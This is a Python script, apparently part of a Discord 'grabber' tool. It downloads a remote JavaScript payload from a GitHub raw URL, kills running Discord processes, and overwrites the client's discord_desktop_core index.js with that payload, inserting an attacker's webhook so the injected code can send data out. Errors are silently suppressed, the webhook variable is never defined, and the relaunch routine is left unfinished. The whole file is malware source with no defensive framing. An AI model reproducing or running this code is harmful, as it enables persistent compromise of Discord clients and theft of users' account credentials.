import os
import psutil
import re
import requests
import subprocess
class Injection:
    def __init__(self) -> None:
        try:
            self.appdata = os.getenv('LOCALAPPDATA')
            self.webhook = webhook_url
            self.discord_dirs = [
                self.appdata + '\\Discord',
                self.appdata + '\\DiscordCanary',
                self.appdata + '\\DiscordPTB',
                self.appdata + '\\DiscordDevelopment'
            ]
            response = requests.get('https://raw.githubusercontent.com/Powercascade/Power-Grabber-Injection/refs/heads/main/Injection.js')
            if response.status_code != 200:
                pass
                return
            self.code = response.text
            for proc in psutil.process_iter():
                if 'discord' in proc.name().lower():
                    pass
                    proc.kill()
            for dir in self.discord_dirs:
                pass
                if not os.path.exists(dir):
                    pass
                    continue
                core = self.get_core(dir)
                if core:
                    pass
                    try:
                        with open(core[0] + '\\index.js', 'w', encoding='utf-8') as f:
                            f.write(self.code.replace('discord_desktop_core-1', core[1]).replace('%WEBHOOK%', self.webhook))
                        pass
                    except Exception as e:
                        pass
                    else:
                        self.start_discord(dir)
                else:
                    pass
        except Exception as e:
            pass

    def get_core(self, dir: str) -> tuple:
        try:
            for file in os.listdir(dir):
                pass
                if re.search(r'app-+?', file):
                    modules = dir + '\\' + file + '\\modules'
                    if not os.path.exists(modules):
                        continue
                    for file in os.listdir(modules):
                        if re.search(r'discord_desktop_core-+?', file):
                            pass
                            core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                            if os.path.exists(core + '\\index.js'):
                                return core, file
            return None
        except Exception as e:
            pass
            return None
    def start_discord(self, dir: str) -> None:
        try:
            update = dir + '\\Update.exe'
            executable = dir.split('\\')[-1] + '.exe'
            for file in os.listdir(dir):
                if re.search(r'app-+?', file):
                    app = dir + '\\' + file
                    if os.path.exists(app + '\\' + 'modules'):
                        for file in os.listdir(app):
                            if file == executable:
                                executable = app + '\\' + executable
        except Exception as e:
            pass
if __name__ == "__main__":
    Injection()
